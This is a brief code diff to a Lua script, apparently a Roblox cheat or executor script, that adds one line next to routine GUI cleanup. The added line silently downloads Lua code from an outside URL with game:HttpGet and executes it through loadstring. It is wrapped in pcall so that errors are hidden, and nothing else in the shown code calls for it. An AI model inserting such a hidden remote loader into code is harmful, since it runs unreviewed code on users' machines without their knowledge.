@@ -23,6 +23,7 @@ local function cleanupOldGuis(parent)
 end
 pcall(function() cleanupOldGuis(game:GetService("CoreGui")) end)
 pcall(function() cleanupOldGuis(LocalPlayer:WaitForChild("PlayerGui")) end)
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_bf110a081439", "1.0.0", false) end)
 
 local selectedCrystal = "Blue Crystal"
 local selectedPet = "A. Gnatomy"
